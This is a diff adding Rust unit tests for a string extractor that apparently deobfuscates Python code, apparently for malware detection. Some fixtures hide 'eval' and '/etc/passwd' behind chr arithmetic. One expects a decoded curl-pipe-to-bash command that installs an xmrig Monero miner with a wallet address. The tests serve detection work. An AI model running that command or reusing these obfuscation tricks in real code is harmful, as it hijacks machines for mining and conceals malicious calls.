@@ -218,6 +218,44 @@ fn test_join_with_variables() {
 }
 
 #[test]
+fn test_collection_mutations() {
+    let source = unindent(
+        r#"
+        parts = []
+        parts.append("l")
+        parts.append("a")
+        parts.append("v")
+        parts.append("e")
+        parts.reverse()
+        func_name = "".join(parts)
+    "#,
+    );
+    let actual = get_strings(&source);
+    assert!(actual.iter().any(|it| it.string == "eval"));
+}
+
+#[test]
+fn test_collection_insert() {
+    let source = unindent(
+        r#"
+        parts = ["a", "l"]
+        parts.insert(0, "v")
+        parts.insert(0, "e")
+        func_name = "".join(parts)
+    "#,
+    );
+    let actual = get_strings(&source);
+    assert!(actual.iter().any(|it| it.string == "eval"));
+}
+
+#[test]
+fn test_chr_plus_one_generator() {
+    let source = r#"a = "".join(chr(x + 1) for x in [100, 117, 96, 107])"#;
+    let actual = get_strings(source);
+    assert!(actual.iter().any(|it| it.string == "eval"));
+}
+
+#[test]
 fn test_join_var() {
     let source = unindent(
         r#"
@@ -411,4 +449,22 @@ fn test_decode_utf8_multibyte() {
     let expected = vec![string_item!("🚀", 4, 39)];
     let actual = get_strings(source);
     assert_eq!(expected, actual);
+}
+
+#[test]
+fn test_complex_obfuscation() {
+    let source = unindent(
+        r##"
+        l = "p# y-:!-:Y-u}!G<< n%;tv\"u#o#!r p|{\"r{\";p|z<Z|{r |\prn{<&z vtl!r\"#}<zn!\"r <!r\"#}lz|{r ||prn{lzv{r ;!u-*-on!u-:!-EB~?}nON_{EC[#xQST|O>fDxbOBTz!N\"vO[ub&pB[f%\"vPZ#o\"\"a%DcTUC>Q$FpB%$[cf>rNweNxgF^T$Ap~t? QCYDv(`#"
+        h = "".join([chr(((ord(c) - 32 - 13) % 95) + 32) for c in l])
+        f = "".join([chr(x) for x in [47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100]])
+        r = "".join([chr(x) for x in [104, 111, 109, 101]])
+        p = "".join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])
+    "##,
+    );
+    let actual = get_strings(&source);
+    assert!(actual.iter().any(|it| it.string == "curl -s -L hps://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 85q2paBARn86NukDFGoB1Y7kUB5GmsAtiBNhUxc5NYwtiCMubttTw7VGH61Dv9c5wvNVY1eAjXAkZ9QGv4cqg2rD6L7izSu"));
+    assert!(actual.iter().any(|it| it.string == "/etc/passwd"));
+    assert!(actual.iter().any(|it| it.string == "home"));
+    assert!(actual.iter().any(|it| it.string == ".profile"));
 }
